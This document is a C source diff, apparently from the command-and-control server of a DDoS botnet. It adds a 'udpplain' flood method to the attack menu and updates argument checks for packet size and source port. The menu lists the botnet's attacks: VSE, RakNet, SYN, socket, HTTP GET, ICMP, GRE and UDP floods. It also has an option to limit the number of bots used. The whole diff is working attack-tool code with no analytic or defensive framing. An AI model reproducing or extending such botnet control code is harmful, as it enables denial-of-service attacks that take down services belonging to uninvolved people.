@@ -54,14 +54,15 @@ ATK LIST   C O M M A N D
 */
 void handle_attack_list_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
-             PINK "!vse - VSE Queries, UDP\r\n"
-             "!raknet - RakNet UnConnected+Magic ping flood\r\n"
-             "!udp - raw/plain flood udp\r\n"
-             "!syn - plain SYN Flood\r\n"
-             "!socket - open connection spam\r\n"
-             "!http - HTTP 1.1 GET flood\r\n"
-             "!icmp - ICMP Echo flood\r\n"
-             "!gre - GRE IP Flood\r\n" RESET);
+             PINK "!vse - UDP Game VSE Query Flood\r\n"
+             "!raknet - RakNet UnConnectedPing flood\r\n"
+             "!syn - TCP SYN+PSH Flood\r\n"
+             "!socket - TCP Stream Connections Flood\r\n"
+             "!http - HTTP 1.1 GET Flood\r\n"
+             "!icmp - ICMP ECHO Flood\r\n"
+             "!gre - GRE IP|TCP|UDP Specific Flood\r\n"
+             "!udp - Plain UDP Flood\r\n"
+             "!udpplain - Plain UDP Flood (FAST)\r\n" RESET);
 }
 
 /*
@@ -70,7 +71,7 @@ OPTHELP   C O M M A N D
 void handle_opthelp_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
              RED "Optional Arguments:\r\n"
-             "psize - packet size (max: 64500-ICMP-UDP-SYN | 1492 VSE-RakNet | 8192-GRE)\r\n"
+             "psize - packet size (max: 64500-ICMP-UDP-SYN | 1492 VSE-RakNet | 1450-UDPPLAIN | 8192-GRE)\r\n"
              "srcport - srcport for UDP-SYN-GRE, Default=Random, max=65535)\r\n"
              "botcount - Limit bots to use\r\n"
              "proto - GRE Proto (tcp/udp) default=none\r\n"
@@ -86,7 +87,8 @@ int is_attack_command(const char *command) {
            strncmp(command, "!http", 5) == 0 ||
            strncmp(command, "!socket", 7) == 0 ||
            strncmp(command, "!icmp", 5) == 0 ||
-           strncmp(command, "!gre", 4) == 0;
+           strncmp(command, "!gre", 4) == 0 ||
+           strncmp(command, "!udpplain", 9) == 0;
 }
 
 void handle_layer3_attack_command(const User *user, const char *command, char *response) {
@@ -423,7 +425,7 @@ void handle_attack_command(const User *user, const char *command, char *response
                 snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate srcport argument\033[0m\n");
                 return;
             }
-            if (is_icmp || strcmp(cmd, "!vse") == 0 || strcmp(cmd, "!http") == 0 || strcmp(cmd, "!socket") == 0 || strcmp(cmd, "!raknet") == 0) {
+            if (is_icmp || strcmp(cmd, "!vse") == 0 || strcmp(cmd, "!http") == 0 || strcmp(cmd, "!socket") == 0 || strcmp(cmd, "!raknet") == 0 || strcmp(cmd, "!udpplain") == 0) {
                 snprintf(response, MAX_COMMAND_LENGTH, "\033[31msrcport not supported for this method\033[0m\n");
                 return;
             }
@@ -445,7 +447,8 @@ void handle_attack_command(const User *user, const char *command, char *response
                 snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate psize argument\033[0m\n");
                 return;
             }
-            if (!(strcmp(cmd, "!udp") == 0 || strcmp(cmd, "!syn") == 0 || strcmp(cmd, "!vse") == 0 || strcmp(cmd, "!raknet") == 0 || is_icmp)) {
+            if (!(strcmp(cmd, "!udp") == 0 || strcmp(cmd, "!syn") == 0 || strcmp(cmd, "!vse") == 0 || 
+                strcmp(cmd, "!raknet") == 0 || strcmp(cmd, "!udpplain") == 0 || is_icmp)) {
                 snprintf(response, MAX_COMMAND_LENGTH, "\033[31mpsize not supported for this method\033[0m\n");
                 return;
             }
